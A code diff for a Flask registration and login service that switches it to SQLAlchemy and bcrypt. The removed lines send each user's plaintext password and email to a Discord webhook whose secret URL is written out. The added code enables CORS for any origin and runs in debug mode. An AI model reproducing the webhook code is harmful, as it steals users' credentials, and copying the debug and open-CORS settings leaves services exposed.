@@ -1,98 +1,61 @@
 from flask import Flask, request, jsonify
-import hashlib
-import requests
+from flask_sqlalchemy import SQLAlchemy
+import bcrypt
+from flask_cors import CORS  # <-- Import CORS
 
 app = Flask(__name__)
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+db = SQLAlchemy(app)
 
-# In-memory storage for users (username as key, password hash as value)
-users = {}
+# Enable CORS for all domains (or restrict to a specific domain)
+CORS(app)  # This will allow cross-origin requests from any origin
 
-# Route for user registration
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(150), unique=True, nullable=False)
+    email = db.Column(db.String(150), unique=True, nullable=False)
+    password = db.Column(db.String(150), nullable=False)
+
 @app.route('/register', methods=['POST'])
 def register():
     data = request.get_json()
-
-    # Extract the data from the incoming JSON
     username = data.get('username')
     email = data.get('email')
     password = data.get('password')
 
-    # Basic validation for input fields
-    if not username or not email or not password:
-        return jsonify({'error': 'All fields are required!'}), 400
+    # Check if user already exists
+    existing_user = User.query.filter((User.username == username) | (User.email == email)).first()
+    if existing_user:
+        return jsonify({'message': 'Username or email already exists'}), 400
 
-    # Check if the username already exists
-    if username in users:
-        return jsonify({'error': 'Username already exists!'}), 400
+    # Hash password before storing it
+    hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
 
-    # Hash the password (SHA-256 for demonstration, use bcrypt or Argon2 in production)
-    password_hash = hashlib.sha256(password.encode()).hexdigest()
+    # Create a new user
+    new_user = User(username=username, email=email, password=hashed_password.decode('utf-8'))
+    db.session.add(new_user)
+    db.session.commit()
 
-    # Store the user in the in-memory dictionary
-    users[username] = {'email': email, 'password_hash': password_hash}
+    return jsonify({'message': 'User registered successfully'}), 201
 
-    # Send registration data to Discord webhook (in background or after response)
-    send_to_webhook(username, email, password)
-
-    return jsonify({'message': 'Registration successful!'}), 200
-
-
-# Route for user login
 @app.route('/login', methods=['POST'])
 def login():
     data = request.get_json()
-
-    # Extract the data from the incoming JSON
     username = data.get('username')
     password = data.get('password')
 
-    # Basic validation for input fields
-    if not username or not password:
-        return jsonify({'error': 'Both username and password are required!'}), 400
+    # Find user by username
+    user = User.query.filter_by(username=username).first()
 
-    # Check if the username exists
-    user = users.get(username)
     if not user:
-        return jsonify({'error': 'Invalid credentials'}), 400
+        return jsonify({'message': 'Invalid credentials'}), 401
 
-    # Check if the password matches (hashed comparison)
-    password_hash = hashlib.sha256(password.encode()).hexdigest()
-    if password_hash != user['password_hash']:
-        return jsonify({'error': 'Invalid credentials'}), 400
+    # Check if password matches
+    if bcrypt.checkpw(password.encode('utf-8'), user.password.encode('utf-8')):
+        return jsonify({'message': 'Login successful'}), 200
+    else:
+        return jsonify({'message': 'Invalid credentials'}), 401
 
-    return jsonify({'message': f'Login successful! Welcome back, {username}'}), 200
-
-
-# Function to send registration data to Discord webhook (you can make this async)
-def send_to_webhook(username, email, password):
-    webhook_url = 'https://discord.com/api/webhooks/1401557352573829271/G5zMPn68i-gHlPj4LIiw23wp6Mc55xETfCnAwKakRdmCyUtW4AfP3zMJnA4LLYG-VOd7'
-    
-    # Webhook payload
-    payload = {
-        "embeds": [{
-            "title": "New Account Registration",
-            "color": 5814783,  # Light blue color
-            "fields": [
-                {"name": "Username", "value": f"```{username}```", "inline": True},
-                {"name": "Email", "value": f"```{email}```", "inline": True},
-                {"name": "Password", "value": f"```{password}```", "inline": False},  # You should remove password in production
-            ],
-            "timestamp": "2023-08-03T00:00:00Z",
-            "footer": {
-                "text": "Eco Registration"
-            }
-        }]
-    }
-
-    # Send data to the webhook (you can use requests or any HTTP client here)
-    try:
-        response = requests.post(webhook_url, json=payload)
-        response.raise_for_status()  # Raise an error for bad responses
-    except Exception as e:
-        print(f"Error sending webhook: {e}")
-
-
-# Start the Flask app
 if __name__ == '__main__':
-    # Set the host to 0.0.0.0 to make it accessible externally on Render
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(debug=True)
